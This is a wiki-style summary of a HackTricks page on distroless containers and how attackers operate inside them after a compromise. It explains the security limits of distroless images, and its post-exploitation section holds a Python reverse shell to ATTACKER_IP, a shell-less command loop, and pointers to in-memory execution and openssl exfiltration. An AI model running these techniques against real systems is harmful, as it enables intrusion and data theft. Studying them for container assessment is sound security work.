---
title: "HackTricks — Distroless Containers"
tags: [container-security, distroless, post-exploitation, hacktricks]
sources: [hacktricks-distroless.md]
updated: 2026-05-01
---

# HackTricks — Distroless Containers

Source: [HackTricks](../entities/hacktricks.md)

## Key Takeaways

Distroless is an **image design strategy**, not a runtime isolation primitive. It removes shells, package managers, and generic userland from the image — reducing post-exploitation tooling available to an attacker — but does **not** replace namespaces, seccomp, capabilities, AppArmor, or SELinux. A distroless image can still be run `--privileged` with host namespace sharing and be catastrophically insecure.

## What Distroless Reduces

- Image size and package CVE surface
- Number of binaries an attacker can invoke post-compromise
- Default shells (`sh`, `bash`), package managers, coreutils

## What Distroless Does NOT Guarantee

Not automatically: rootless, non-privileged, read-only, or protected by seccomp/MAC. The **kernel trust boundary** is unchanged — only the **userland attack surface** changes.

## Post-Exploitation in Distroless

### 1. Use the installed language runtime directly

If the app is Python:

```python
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```

If the app is Node.js:

```js
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```

### 2. Reverse shell without `/bin/sh`

Python reverse shell (replace `pty.spawn` with Python loop if `/bin/sh` absent):

```python
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
    os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```

No-shell Python interactive loop:

```python
python3 - <<'PY'
import os,subprocess
while True:
    cmd=input("py> ")
    if cmd.strip() in ("exit","quit"): break
    p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
    print(p.stdout, end=""); print(p.stderr, end="")
PY
```

### 3. In-memory tool execution

When `readOnlyRootFilesystem: true` + writable `noexec` tmpfs (e.g. `/dev/shm`):

- `memfd_create` + `execve` via scripting runtimes
- **DDexec** / **EverythingExec**
- `memexec`
- `memdlopen`

### 4. Existing useful binaries

Some distroless images include operationally necessary tools:

```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```

`openssl` → outbound TLS, data exfiltration over allowed egress channels.

## Checks

```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100   # Small rootfs = likely distroless
which sh bash ash busybox python python3 node java 2>/dev/null
cat /etc/os-release 2>/dev/null                         # Often missing/minimal
mount | grep -E ' /( |$)|/dev/shm'                      # Read-only rootfs + noexec tmpfs
```

Key signals:

- No shell → pivot to runtime-driven execution
- Read-only rootfs + noexec `/dev/shm` → use memory execution techniques
- `openssl`, `busybox`, or language runtimes present → bootstrap further access

## Runtime Defaults Table

| Image style        | Typical behavior                                                     | Common weakening                                        |
| ------------------ | -------------------------------------------------------------------- | ------------------------------------------------------- |
| Google distroless  | No shell, no pkg mgr, only runtime deps                              | Adding debug layers, copying busybox in                 |
| Chainguard minimal | Reduced surface, one runtime/service                                 | Using `:latest-dev` or debug variants                   |
| K8s workloads      | Distroless = image property only; Pod security still depends on spec | Ephemeral debug containers, host mounts, privileged Pod |
| Docker/Podman      | Minimal FS, but runtime security depends on flags                    | `--privileged`, host namespace sharing, socket mounts   |

## Related Pages

- [Container Security](../concepts/container-security.md)
- [HackTricks — Container Assessment and Hardening](hacktricks-assessment-and-hardening.md)
- [HackTricks](../entities/hacktricks.md)
